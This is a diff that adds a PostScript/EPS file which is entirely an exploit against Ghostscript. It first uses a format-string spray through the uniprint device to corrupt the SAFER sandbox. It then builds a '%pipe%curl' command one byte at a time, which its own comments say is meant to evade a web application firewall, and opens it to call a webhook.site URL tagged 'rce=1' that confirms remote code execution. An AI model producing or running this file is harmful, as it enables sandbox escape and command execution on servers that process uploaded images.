@@ -1,0 +1,42 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Step 1: uniprint format string spray to corrupt SAFER
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (\045d\045d\045d\045d\045n\045d\045d\045d\045n\045d\045d\045n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% Step 2: Try pipe via obfuscated string
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Build pipe string at runtime to bypass WAF
+/pipestr 256 string def
+pipestr 0 37 put  % %
+pipestr 1 112 put % p
+pipestr 2 105 put % i
+pipestr 3 112 put % p
+pipestr 4 101 put % e
+pipestr 5 37 put  % %
+pipestr 6 99 put  % c
+pipestr 7 117 put % u
+pipestr 8 114 put % r
+pipestr 9 108 put % l
+pipestr 10 32 put % space
+
+% Add callback URL
+/cburl (https://webhook.site/a6c22db4-6641-4d72-b76e-f290cdbaa8a6?rce=1) def
+cburl length 0 exch 1 exch 1 sub {
+  cburl exch get
+  pipestr exch 11 add exch put
+} for
+
+% Try to open it
+pipestr 0 11 cburl length add getinterval
+(w) file closefile
+
+showpage
